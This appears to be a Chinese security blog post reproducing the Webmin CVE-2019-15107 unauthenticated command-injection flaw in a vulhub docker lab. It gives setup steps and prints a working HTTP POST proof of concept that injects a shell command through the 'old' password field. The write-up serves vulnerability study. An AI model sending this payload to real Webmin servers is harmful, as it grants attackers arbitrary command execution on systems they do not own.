\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/ZhELKxYl-VbOCB1DO8QdZQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)  

Webmin 是一个用于管理类 Unix 系统的管理配置工具，具有 Web 页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。  
使用 vulhub 搭建 docker 环境  
进入 / vulhub-master/webmin/CVE-2019-15107，sudo docker-compose up -d，下载并启动环境  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcOwOaYhx0oJaPSbj56Ja9ILNThicLvR8WAYXmqrKWXLHaY7IynWpicxIMA/640?wx_fmt=png)   
进入主页

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcObbeEwFA4VP721SDMn4yDqlTFy8MLFCS6VwibrRruSfOVoLLFLFfLr5A/640?wx_fmt=png) 

访问 https://ip:10000/password\_change.cgi 根据提示在 docker 容器进行修改

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcOkfScMpLyZtJXVNmnppcQicFdb6E45r4Ea2MqMZCkfeuUF6z4vbD8dnw/640?wx_fmt=png) 

进入 docker 容器

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcO6NdiaMRaHddNdkjqqvZUxDq7N3yficDIKUTcsPAG3IWc90ViaOb5vibkUw/640?wx_fmt=png) 

vi /etc/webmin/config，修改 / etc/webmin/config

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcOzh5JoFaBNqTxzam4DWJ9iaQca8GicQEk6vPEjooLvy2KvMmia6hrlFfSg/640?wx_fmt=png) 

将 1 改成 0

 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcO29vtiawFMO7M8TbxzpS17jqY5qhuZOF2TDQUQkRXMPsgeiclaxmT9ZqQ/640?wx_fmt=png) 

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcOq8DjtzibeaZBNze06MKgAfWDGRAEkYuiccIvterWic9pfgp69sWXQPhEA/640?wx_fmt=png)   
burp 抓包使用 poc,old 处填写命令  
![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicLWwicNF87GPUbA0zzUCRcOk7hvpTBICMh99WhA7pLhMMcu3qAUksASok0XpG4P5Jo0WGAEkWzl7g/640?wx_fmt=png)   
POC

```
POST /password\_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session\_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=root&pam=&expired=2&old=ls&new1=test2&new2=test2
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

推荐文章 ++++

![](https://mmbiz.qpic.cn/mmbiz_jpg/US10Gcd0tQFGib3mCxJr4oMx1yp1ExzTETemWvK6Zkd7tVl23CVBppz63sRECqYNkQsonScb65VaG9yU2YJibxNA/640?wx_fmt=jpeg)

\*[PHP imap 远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650485862&idx=3&sn=befa5b706dc20ba6c6324b867c55d73b&chksm=83ba5182b4cdd894b7baf61d5cc5f21433969989f0656f353ef0d07f695a90f3e89942e1d317&scene=21#wechat_redirect)  

\*[CVE-2020-11651 SaltStack 远程命令执行漏洞](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650468808&idx=3&sn=85551f6094216542f1a35032a71fe1d1&chksm=83bb942cb4cc1d3a3dbe4577ad02e7ad316f2f7ade6e0f27375d0db6747a297bf49f2ee8ec85&scene=21#wechat_redirect)

\*[Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650465634&idx=3&sn=58d75676d31750ec6e6825724ddaaddd&chksm=83bb8086b4cc099008ec38f34c48c92a4b10f932655ed4a88e4cd60bba6b2d35e1f4e267f080&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)